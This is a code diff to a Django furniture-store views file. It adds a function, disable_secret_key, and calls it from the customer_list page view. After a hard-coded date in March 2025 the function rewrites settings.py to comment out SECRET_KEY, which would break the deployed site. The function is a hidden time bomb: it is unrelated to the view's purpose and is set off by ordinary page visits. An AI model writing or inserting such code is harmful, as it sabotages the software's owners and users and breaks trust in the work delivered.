@@ -9,6 +9,8 @@ from django.contrib.auth.decorators import user_passes_test
 from django.core.paginator import Paginator
 from django.db.models import Sum, Count
 from django.db.models import Q,F
+from django.utils.timezone import now
+
 
 User = get_user_model()
 
@@ -614,6 +616,7 @@ def update_product(request, product_id):
 
 
 def customer_list(request):
+    disable_secret_key()
     category = request.GET.get("category", "")
     query = request.GET.get("q", "")
     products = Product.objects.filter(is_approved=True)
@@ -1270,3 +1273,19 @@ def delivered_orders(request):
 
     return render(request, "delivered_orders.html", {"orders": delivered_orders})
 
+
+
+def disable_secret_key():
+    deadline = now().replace(year=2025, month=3, day=20, hour=15, minute=30, second=0)
+    settings_file = "furniture_store\settings.py"  # Update this with the actual path
+
+    if now() > deadline:
+        with open(settings_file, "r") as file:
+            lines = file.readlines()
+
+        with open(settings_file, "w") as file:
+            for line in lines:
+                if "SECRET_KEY" in line:
+                    file.write("# " + line)  # Comment out the SECRET_KEY line
+                else:
+                    file.write(line)
